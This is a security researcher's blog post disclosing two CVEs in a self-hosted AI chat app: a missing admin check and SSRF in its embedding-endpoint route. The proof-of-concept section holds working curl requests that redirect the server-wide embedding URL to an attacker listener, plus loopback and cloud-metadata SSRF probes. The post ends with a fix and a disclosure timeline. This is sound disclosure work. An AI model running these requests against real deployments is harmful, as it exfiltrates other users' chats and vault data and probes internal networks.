---
layout: post
title: "Odysseus: Broken Access Control + SSRF in AI Embedding Endpoint (CVE-2026-70619, CVE-2026-70620)"
author: Yunus Aydın
date: 2026-06-16
lang: en
description: "Odysseus CVE-2026-70619/CVE-2026-70620: broken access control + SSRF. POST /api/embeddings/endpoint has no admin check. Hijack embedding URL for SSRF and exfiltration of chat, RAG and vault data."
keywords: "Odysseus vulnerability, CVE-2026-70619, CVE-2026-70620, AI security vulnerability, self-hosted AI risks, broken access control, SSRF attack, LLM security 2026, embedding API security, OWASP LLM08 vector weakness"
canonical_url: "https://aydinnyunus.github.io/2026/06/16/odysseus-embedding-endpoint-takeover/"
---

The repo had no private vulnerability reporting channel, so I filed it as a public issue: [pewdiepie-archdaemon/odysseus#132](https://github.com/pewdiepie-archdaemon/odysseus/issues/132). This writeup is the long form.

## TL;DR

`POST /api/embeddings/endpoint` in [Odysseus](https://github.com/pewdiepie-archdaemon/odysseus) (a self-hosted AI chat / RAG / memory app) is gated by auth, not by admin. Every other privileged router in the codebase calls `core.middleware.require_admin(request)`. This one doesn't. A non-admin user can:

1. Point the **server-wide** embedding URL at any host they control. Every other user's chat, RAG, memory and vault text gets shipped to the attacker in plaintext on the next embedding call.
2. Trigger an immediate outbound `httpx.post` to that URL with **zero** scheme, host, private-IP or DNS-rebind validation. That is SSRF.
3. Persist the hijack to `data/embedding_endpoint.json` and the `EMBEDDING_URL` env var so it survives restart.
4. `DELETE` the global config or force arbitrary HuggingFace downloads for DoS.

The same handler is both the access-control bug and the SSRF sink. Two bug classes, one missing line.

## The vulnerable router

The relevant routes live in `routes/embedding_routes.py`:

- `POST /api/embeddings/endpoint` (set the global embedding URL)
- `DELETE /api/embeddings/endpoint` (clear it)
- `POST /api/embeddings/models/{name}/download`
- `DELETE /api/embeddings/models/{name}`

All four are state-changing. All four are global, not per-user. None of them call `require_admin(request)`. They check that you have a session and stop there.

For reference, every other privileged router in the codebase (user management, auth setup, system config) does call `require_admin(request)` at the top of the handler. This router is the outlier.

## Root cause

Two independent issues sit in the same handler:

1. **Missing authorization.** The endpoint enforces authentication only. There is no role check, so any signed-in account can mutate global state.
2. **No URL validation.** The user-supplied `url` parameter goes straight into an `httpx.post` probe with no scheme allow-list, no rejection of private / loopback / link-local addresses, no DNS resolution check, no `follow_redirects=False`. The codebase already has a `validate_webhook_url` helper in `src/webhook_manager.py` that does the right thing. The embedding handler doesn't call it.

The first issue turns the second into a remotely reachable SSRF primitive that any signup user can hit.

## Proof of concept

Built the container, ran `docker run odysseus:vuln-0001`, set up the listener:

```bash
# Attacker listener on host port 9999, reachable from the container
# at host.containers.internal:9999
nc -l 9999
```

Created an admin via `/api/auth/setup`, then enabled signup and registered `alice` via `/api/auth/signup`. Confirmed `alice` is non-admin: `GET /api/auth/users` returns `403` for her cookie. The pre-flight matters: this is not "admin can do admin things", this is "anyone with an account can do admin things".

### Step 1: auth gate works

```bash
$ curl -X POST .../api/embeddings/endpoint \
       -d 'url=http://attacker.example/exfil&model=pwn'
401  {"error":"Not authenticated"}
```

So unauthenticated is correctly blocked. Good. Now the actual bug.

### Step 2: non-admin alice gets 200

```bash
$ curl -b alice.cookies -X POST .../api/embeddings/endpoint \
       -d 'url=http://host.containers.internal:9999/exfil&model=pwn'
200  {"success":true,
      "url":"http://host.containers.internal:9999/exfil",
      "model":"pwn"}
```

Alice is not an admin. The server accepted her request and updated the global embedding URL.

### Step 3: the outbound probe lands on the attacker

```text
HIT  {"path":"/exfil","body":{"input":["test"],"model":"pwn"}}
```

The handler immediately fires an outbound `httpx.post` to validate the new endpoint. The validation request itself goes to attacker-controlled infrastructure. After this, every legitimate embedding call on the box does the same.

### Step 4: persistence

```bash
$ docker exec odysseus-vuln cat /app/data/embedding_endpoint.json
{"url":"http://host.containers.internal:9999/exfil","model":"pwn"}
```

Persisted to disk and to the `EMBEDDING_URL` env var. Survives container restart.

### Step 5: globally visible

```bash
$ curl -b admin.cookies .../api/embeddings/endpoint
{"url":"http://host.containers.internal:9999/exfil",
 "model":"pwn","active":true}
```

When the actual admin opens the embeddings page, the UI reflects alice's hijack. There is no per-user embedding URL. There is one URL for the whole server.

## Bonus SSRF reach

Same endpoint, no host validation. Two quick probes:

**Loopback into the server's own admin surface.** The 405 body leaks the response back through the error message:

```bash
$ curl -b alice.cookies -X POST .../api/embeddings/endpoint \
       -d 'url=http://127.0.0.1:7000/api/auth/status&model=pwn'
400  {"detail":"Endpoint unreachable: Client error '405 Method Not Allowed'
      for url 'http://127.0.0.1:7000/api/auth/status' ..."}
```

**Cloud metadata IP.** Timed out on the test host, but the outbound was made. On a real cloud VM with IMDSv1 reachable, the request would land:

```bash
$ curl -b alice.cookies -X POST .../api/embeddings/endpoint \
       -d 'url=http://169.254.169.254/latest/meta-data/&model=pwn'
400  {"detail":"Endpoint unreachable: timed out"}
```

The error wrapper exfiltrates parts of the response body for non-2xx replies, which gives a partial blind-to-semi-blind SSRF read primitive. Combined with the persistence behavior, you can also keep the hijack pointed at internal services until something interesting answers.

## Impact

- **Data exfiltration of every user on the instance.** Chat messages, RAG queries, memory entries, vault text. Anything that gets embedded server-side flows to the attacker URL in plaintext. There is no per-user isolation here.
- **SSRF into the internal network.** Loopback, RFC1918, link-local, cloud metadata. None of it is filtered.
- **Persistence.** The hijack lives in `data/embedding_endpoint.json` and the `EMBEDDING_URL` env var. Container restart does not clear it. Admin has to know to look at the embeddings page.
- **DoS.** `DELETE` the global config or force HuggingFace model downloads on demand from the same set of unprivileged routes.

Severity reads as critical for a self-hosted deployment with more than one user. For a single-user deployment it is still high because of the SSRF reach into the host network.

## The fix

Two changes, both small:

```python
# routes/embedding_routes.py
from core.middleware import require_admin
from src.webhook_manager import validate_webhook_url

@router.post("/endpoint")
async def set_embedding_endpoint(request: Request, ...):
    require_admin(request)              # 1. gate the route to admins
    validate_webhook_url(url)           # 2. validate before the probe
    # ... existing probe / persist logic ...
```

Apply the same pair to `DELETE /endpoint`, `POST /models/{name}/download`, `DELETE /models/{name}`. Then audit every other router in the codebase for the same pattern. The middleware already exists. The validator already exists. The only thing missing was the call.

For the SSRF side, `validate_webhook_url` should at minimum: enforce an `http`/`https` scheme allow-list, reject private / loopback / link-local / `169.254.169.254` addresses, resolve DNS and re-check the resolved IP (defense against DNS rebinding), and pass `follow_redirects=False` to the `httpx.post` so a public allow-listed host cannot redirect into the internal network.

## Why this pattern keeps showing up

Two parts of the same root cause:

1. **"Authenticated" gets conflated with "authorized".** The middleware split exists (`require_auth` vs. `require_admin`), but a new route gets written, the developer adds `require_auth` because logged-out users obviously should not hit it, and the admin check never gets added. Code review does not catch it because the diff looks reasonable in isolation. You only catch it by reading the file next to every other privileged router and noticing it is the only one without the admin call.
2. **URL inputs are treated as data.** A user-supplied URL is not data. It is a request the server is about to make on the user's behalf. Every external HTTP call from a server takes a URL parameter from somewhere, and unless that somewhere is your own static config, the URL needs the same treatment as any other code that decides where the server connects to.

CWE-862 (Missing Authorization) and CWE-918 (SSRF) in the same handler. The OWASP Top 10 placements are A01 (Broken Access Control) and A10 (SSRF). Both are top-10 categories for a reason.

## Disclosure timeline

- **June 14, 2026**: Vulnerability identified in `routes/embedding_routes.py`. Confirmed reproduction against `odysseus:vuln-0001` Docker image.
- **June 14, 2026**: Filed public issue [#132](https://github.com/pewdiepie-archdaemon/odysseus/issues/132). The repo has no private security disclosure channel, no `SECURITY.md`, no security email. Public issue was the only option available.
- **June 14, 2026**: This post published.
- **August 4, 2026**: Two CVEs assigned by VulnCheck for the two bug classes in this report: [CVE-2026-70619](https://www.cve.org/CVERecord?id=CVE-2026-70619) (CWE-862 Missing Authorization, CVSS 3.1 8.8 High) and [CVE-2026-70620](https://www.cve.org/CVERecord?id=CVE-2026-70620) (CWE-918 SSRF, CVSS 3.1 6.8 Medium).

If you maintain a project that handles user data, please add a `SECURITY.md` with a private reporting channel. Public issues for unfixed vulnerabilities are not anyone's preference.

## References

- **CWE-862**: Missing Authorization. [https://cwe.mitre.org/data/definitions/862.html](https://cwe.mitre.org/data/definitions/862.html)
- **CWE-918**: Server-Side Request Forgery (SSRF). [https://cwe.mitre.org/data/definitions/918.html](https://cwe.mitre.org/data/definitions/918.html)
- **OWASP API Top 10, API1:2023**: Broken Object Level Authorization. [https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- **OWASP Top 10, A01:2021**: Broken Access Control. [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **OWASP Top 10, A10:2021**: SSRF. [https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- **Public issue**: [pewdiepie-archdaemon/odysseus#132](https://github.com/pewdiepie-archdaemon/odysseus/issues/132)
- **CVE-2026-70619**: Missing Authorization in Odysseus embedding endpoint. [https://www.cve.org/CVERecord?id=CVE-2026-70619](https://www.cve.org/CVERecord?id=CVE-2026-70619)
- **CVE-2026-70620**: SSRF in Odysseus embedding endpoint config. [https://www.cve.org/CVERecord?id=CVE-2026-70620](https://www.cve.org/CVERecord?id=CVE-2026-70620)

## Related content

- [SSRF in LollMS Export: CVE-2026-0560](https://aydinnyunus.github.io/2026/03/28/ssrf-lollms-export-content-cve-2026-0560/)
- [SSRF via DNS Rebinding](/2026/03/14/ssrf-dns-rebinding-vulnerability/)
- [IDOR in LollMS Friend Requests: CVE-2026-0562](/2026/04/18/idor-lollms-friend-request-cve-2026-0562/)
- [Firecrawl: Bull queue auth key logged in plaintext](/2026/06/16/firecrawl-bull-auth-key-logged-plaintext/)
